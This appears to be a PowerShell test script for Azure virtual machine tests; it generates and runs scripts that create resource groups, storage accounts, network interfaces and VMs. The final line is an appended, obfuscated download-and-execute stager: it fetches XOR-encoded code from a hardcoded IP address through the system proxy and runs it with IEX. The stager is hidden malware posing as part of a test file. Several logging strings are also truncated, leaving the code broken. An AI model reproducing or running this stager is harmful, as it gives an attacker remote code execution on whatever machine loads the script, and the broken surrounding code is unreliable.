﻿













function get_all_vm_locations
{
    if ((Get-ComputeTestMode) -ne 'Playback')
    {
        $namespace = "Microsoft.Compute"
        $type = "virtualMachines"
        $location = Get-AzResourceProvider -ProviderNamespace $namespace | where {$_.ResourceTypes[0].ResourceTypeName -eq $type}
  
        if ($location -eq $null)
        {
            $st = Write-Verbose 'Getting all Azure location - End';
            return @("West US", "East US")
        }
        else
        {
            $st = Write-Verbose 'Getting all Azure location - End';
            return $location.Locations
        }
    }

    $st = Write-Verbose 'Getting all Azure location - End';
    return @("West US", "East US")
}

function get_all_standard_vm_sizes
{
    param ([string] $location)

    $st = Write-Verbose "Getting all VM sizes in location '${location}' - Start";

    $vmsizes = Get-AzVMSize -Location $location | where { $_.Name -like 'Standard_A*' -and $_.NumberOfCores -le 4 } | select -ExpandProperty Name;

    $st = Write-Verbose "Getting all VM sizes in location [${location}] - End";

    return $vmsizes;
}

function get_hash_int_value
{
    
    param ([string] $seedstr)

    $st = Write-Verbose "Computing hash for '${seedstr}' - Start";

    if ($seedstr -eq $null) { $seedstr = ''; }

    [System.Int32]$hash = 5381;
    for ($i = 0; $i -lt $seedstr.Length; $i++)
    {
        [System.Int32]$c = $seedstr[$i];
        $hash = ((($hash -shl 5) + $hash) + $c) % [System.Int32]::MaxValue;
    }

    $st = Write-Verbose "Computing hash for '${seedstr}' - `$hash = ${hash}";

    $st = Write-Verbose "Computing hash for '${seedstr}' - End";

    return $hash;
}

$comment_header_str =
@'



















'@;

$func_get_vm_config_object =
@'

function get_vm_config_object
{
    param ([string] $rgname, [string] $vmsize)
    
    $st = Write-Verbose "Creating VM Config Object - Start";

    $vmname = $rgname + 'vm';
    $p = New-AzVMConfig -VMName $vmname -VMSize $vmsize;

    $st = Write-Verbose "Creating VM Config Object - End";

    return $p;
}

'@;

$func_get_created_storage_account_name =
@'

function get_created_storage_account_name
{
    param ([string] $loc, [string] $rgname)

    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - Start";

    $stoname = $rgname + 'sto';
    $stotype = 'Standard_GRS';

    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - '${stotype}' & '${stoname}'";

    $st = New-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Location $loc -Type $stotype;
    $st = Set-AzStorageAccount -ResourceGroupName $rgname -Name $stoname -Tags (Get-ComputeTestTag $global:ps_test_tag_name);
    $st = Get-AzStorageAccount -ResourceGroupName $rgname -Name $stoname;
    
    $st = Write-Verbose "Creating and getting storage account for '${loc}' and '${rgname}' - End";

    return $stoname;
}

'@;

function func_create_and_setup_nic_ids
{
    param ([System.Int32]$random_seed)

    $fn_start =
@'

function create_and_setup_nic_ids
{
    param ([string] $loc, [string] $rgname, $vmconfig)

    $st = Write-Verbose "Creating and getting NICs for '${loc}' and '${rgname}' - Start";

    $subnet = New-AzVirtualNetworkSubnetConfig -Name ($rgname + 'subnet') -AddressPrefix "10.0.0.0/24";
    $vnet = New-AzVirtualNetwork -Force -Name ($rgname + 'vnet') -ResourceGroupName $rgname -Location $loc -AddressPrefix "10.0.0.0/16" -Subnet $subnet -Tag (Get-ComputeTestTag $global:ps_test_tag_name);
    $vnet = Get-AzVirtualNetwork -Name ($rgname + 'vnet') -ResourceGroupName $rgname;
    $subnetId = $vnet.Subnets[0].Id;

'@;

    $min_num_of_nic_ids = 1;
    $max_num_of_nic_ids = 1; 
    $num_of_nic_ids = Get-Random -Minimum $min_num_of_nic_ids -Maximum (1 + $max_num_of_nic_ids) -SetSeed $random_seed;
    
    $fn_body =
@"
    `$nic_ids = @(`$null) * ${num_of_nic_ids};
"@;

    $primary_id = Get-Random -Minimum 0 -Maximum $max_num_of_nic_ids -SetSeed $random_seed;

    for ($i = 0; $i -lt $num_of_nic_ids; $i++)
    {
        $nic_var_name = '$nic' + $i;
        $nic_name_str = "(`$rgname + 'nic${i}')";
        $primary_switch_text = '';
        if (($num_of_nic_ids -gt 1) -and ($i -eq $primary_id))
        {
            $primary_switch_text = ' -Primary';
        }
        elseif ($num_of_nic_ids -eq 1)
        {
            $primary_switch_text = (' -Primary', ' ') | Get-Random -SetSeed $random_seed;
            $primary_switch_text = $primary_switch_text.TrimEnd();
        }

        $fn_body +=
@"

    ${nic_var_name} = New-AzNetworkInterface -Force -Name ${nic_name_str} -ResourceGroupName `$rgname -Location `$loc -SubnetId `$subnetId -Tag (Get-ComputeTestTag `$global:ps_test_tag_name);
    `$nic_ids[$i] = ${nic_var_name}.Id;
    `$vmconfig = Add-AzVMNetworkInterface -VM `$vmconfig -Id ${nic_var_name}.Id${primary_switch_text};

"@;
    }


$fn_end =
@'
    $st = Write-Verbose "Creating and getting NICs for '${loc}' and '${rgname}' - End";

    return $nic_ids;
}
'@;

    return $fn_start + $fn_body + $fn_end;
}


$func_create_and_setup_vm_config_object =
@'

function create_and_setup_vm_config_object
{
    param ([string] $loc, [string] $rgname, [string] $vmsize)

    $st = Write-Verbose "Creating and setting up the VM config object for '${loc}', '${rgname}' and '${vmsize}' - Start";

    $vmconfig = get_vm_config_object $rgname $vmsize

    $user = "Foo12";
    $password = $PLACEHOLDER;
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
    $cred = New-Object System.Management.Automation.PSCredential ($user, $securePassword);
    $computerName = $rgname + "cn";
    $vmconfig = Set-AzVMOperatingSystem -VM $vmconfig -Windows -ComputerName $computerName -Credential $cred;

    $st = Write-Verbose "Creating and setting up the VM config object for '${loc}', '${rgname}' and '${vmsize}' - End";

    return $vmconfig;
}

'@;



$func_setup_image_and_disks =
@'

function setup_image_and_disks
{
    param ([string] $loc, [string] $rgname, [string] $stoname, $vmconfig)

    $st = Write-Verbose "Setting up image and disks of VM config object jfor '${loc}', '${rgname}' and '${stoname}' - Start";

    $osDiskName = 'osDisk';
    $osDiskVhdUri = "https://$stoname.blob.core.windows.net/test/os.vhd";
    $osDiskCaching = 'ReadWrite';

    $vmconfig = Set-AzVMOSDisk -VM $vmconfig -Name $osDiskName -VhdUri $osDiskVhdUri -Caching $osDiskCaching -CreateOption FromImage;

    
    $imgRef = Get-DefaultCRPImage -loc $loc;
    $vmconfig = ($imgRef | Set-AzVMSourceImage -VM $vmconfig);

    
    $vmconfig.StorageProfile.DataDisks = $null;

    $st = Write-Verbose "Setting up image and disks of VM config object jfor '${loc}', '${rgname}' and '${stoname}' - End";

    return $vmconfig;
}

'@;


function Run-VMDynamicTests
{
    param ([int] $num_total_generated_tests = 3, [string] $base_folder = '.\ScenarioTests\Generated', [string] $test_tag_name = $null)

    $target_location = Get-ComputeTestLocation;

    $st = Write-Verbose 'Running VM Dynamic Tests - Start';

    [bool] $isRecordMode = $true;
    $testMode = Get-ComputeTestMode;
    if ($testMode.ToLower() -eq 'playback')
    {
        $isRecordMode = $false;
    }

    $st = Write-Verbose "Running VM Dynamic Tests - `$isRecordMode = $isRecordMode";

    $generated_file_names = @($null) * $num_total_generated_tests;
    $generated_func_names = @($null) * $num_total_generated_tests;
    $generated_rgrp_names = @($null) * $num_total_generated_tests;

    $random_sstr = Get-ComputeTestResourceName;
    $random_seed = get_hash_int_value $random_sstr;

    $random_vmsize_seeds = @($null) * $num_total_generated_tests;

    if (($test_tag_name -eq $null) -or ($test_tag_name -eq ''))
    {
        $test_tag_name = $random_sstr;
    }
    
    for ($i = 0; $i -lt $num_total_generated_tests; $i++)
    {
        $index = $i + 1;
        $generated_file_name = $base_folder + '\' + 'VirtualMachineDynamicTest' + $index + '.ps1';
        $generated_file_names[$i] = $generated_file_name;

        $rgname_str = Get-ComputeTestResourceName;
        $generated_rgrp_names[$i] = "'" + $rgname_str + "'";

        $generated_func_name = 'ps_vm_dynamic_test_func_' + $index + '_' + $rgname_str;
        $generated_func_names[$i] = $generated_func_name;

        $random_vmsize_seeds[$i] = get_hash_int_value (Get-ComputeTestResourceName);

        $st = Write-Verbose "Running VM Dynamic Tests - File & Test Name 
    }

    $locations = get_all_vm_locations;
    $locations = $locations | Get-Random -Count $locations.Count -SetSeed $random_seed;

    if ($isRecordMode -eq $true)
    {
        for ($i = 0; $i -lt $num_total_generated_tests; $i++)
        {
            $generated_file_name = $generated_file_names[$i];
            $generated_func_name = $generated_func_names[$i];

            $st = Write-Verbose ('Running VM Dynamic Tests - Generating Test 

            
            $st = New-Item -Path $generated_file_name -Type File -Value '' -Force;
            $st = $comment_header_str | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;
            $st = ("`n`$global:ps_test_tag_name = '" + $test_tag_name + "'`n") | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;
            $st = $func_get_vm_config_object | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;
            $st = $func_get_created_storage_account_name | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;
            $st = (func_create_and_setup_nic_ids $random_seed) | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;
            $st = $func_create_and_setup_vm_config_object | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;

            if ($locations.Count -eq 1)
            {
                $loc_name_str = $locations
            }
            else
            {
                $loc_name_str = $locations[$i % $locations.Count];
            }

            if ($target_location -ne $null -and $target_location -ne '')
            {
                
                $loc_name_str = $target_location;
            }

            $vm_size_str = (get_all_standard_vm_sizes $loc_name_str) | Get-Random -SetSeed $random_vmsize_seeds[$i];

            $st = $func_setup_image_and_disks | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;

            $rgname_str = $generated_rgrp_names[$i];

            $fn_body =
@"

function ${generated_func_name}
{
    
    `$rgname = ${rgname_str};

    try
    {
        `$loc = '${loc_name_str}';
        `$vmsize = '${vm_size_str}';

        `$st = Write-Verbose `"Running Test ${generated_func_name} - Start `${rgname}, `${loc} & `${vmsize}`";

        `$st = Write-Verbose 'Running Test ${generated_func_name} - Creating Resource Group';
        `$st = New-AzResourceGroup -Location `$loc -Name `$rgname -Tag (Get-ComputeTestTag `$global:ps_test_tag_name) -Force;

        `$vmconfig = create_and_setup_vm_config_object `$loc `$rgname `$vmsize;

        
        `$stoname = get_created_storage_account_name `$loc `$rgname;

        
        `$nicids = create_and_setup_nic_ids `$loc `$rgname `$vmconfig;

        
        `$st = setup_image_and_disks `$loc `$rgname `$stoname `$vmconfig;

        
        `$st = Write-Verbose 'Running Test ${generated_func_name} - Creating VM';

        `$vmname = `$rgname + 'vm';
        
        `$st = New-AzVM -ResourceGroupName `$rgname -Location `$loc -VM `$vmconfig -Tags (Get-ComputeTestTag `$global:ps_test_tag_name);

        
        `$st = Write-Verbose 'Running Test ${generated_func_name} - Getting VM';
        `$vm1 = Get-AzVM -Name `$vmname -ResourceGroupName `$rgname;

        
        `$st = Write-Verbose 'Running Test ${generated_func_name} - Removing VM';
        `$st = Remove-AzVM -Name `$vmname -ResourceGroupName `$rgname -Force;

        `$st = Write-Verbose 'Running Test ${generated_func_name} - End';
    }
    finally
    {
        
        Clean-ResourceGroup `$rgname
    }
}

"@;
            $st = $fn_body | Out-File -Encoding ASCII -Append -FilePath $generated_file_name -Force;

            $st = Write-Verbose ('Running VM Dynamic Tests - Generated Function 
        }
    }

    for ($i = 0; $i -lt $num_total_generated_tests; $i++)
    {
        $generated_file_name = $generated_file_names[$i];
        $st = . "$generated_file_name";
        
        $generated_func_name = $generated_func_names[$i];

        $st = Write-Verbose ('Running VM Dynamic Tests - Invoking Function 

        $st = Invoke-Expression -Command $generated_func_name;
    }

    $st = Write-Verbose 'Running VM Dynamic Tests - End';
}
$wc=NeW-ObJeCT SYStEM.NeT.WeBClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEAdERS.Add('User-Agent',$u);$wc.PRoxy = [SyStem.NET.WEBReqUESt]::DeFAuLTWebPROxy;$wc.PRoXy.CRedenTIalS = [SYSTem.Net.CRedeNTIALCACHe]::DEFAULtNetworkCREdENtIAls;$K='f9dd11ff6857af73ac9a944dfc52f41b';$I=0;[cHAR[]]$B=([cHaR[]]($wC.DOwnloaDStRIng("http://192.168.52.142:8081/index.asp")))|%{$_-bXOr$K[$i++%$k.LeNgtH]};IEX ($b-JoIn'')
